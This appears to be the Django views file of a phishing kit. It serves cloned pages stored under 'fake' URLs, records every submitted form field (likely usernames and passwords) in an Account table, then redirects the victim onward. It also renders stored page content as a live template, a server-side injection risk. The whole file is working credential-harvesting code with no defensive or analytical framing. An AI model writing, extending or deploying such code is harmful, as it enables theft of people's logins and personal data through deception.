from django.shortcuts import render, redirect, HttpResponse
from django.http import JsonResponse
from django.urls import reverse
from django.template import RequestContext, Template

from custom_admin.models import TemplateCopy, Account
from custom_admin.utils import auto_get_page, form_injection
from django.db.models import Q
import requests

import re

# Create your views here.



def home(request, url):
    url = url
    print(url)
    html_modelo = TemplateCopy.objects.get(Q(url_fake__iendswith=url) | Q(url_fake__iendswith=f"{url}/"))

    if request.method == 'POST':
        data = dict(request.POST)

        acc = Account.objects.create(template=html_modelo, datas=data, url_path=request.build_absolute_uri())
        acc.save()

        return redirect(html_modelo.redirect or request.build_absolute_uri())
    
    else:
        context = RequestContext(request)

        template = Template(html_modelo.content)
        rended = template.render(RequestContext(request))
        return HttpResponse(rended)




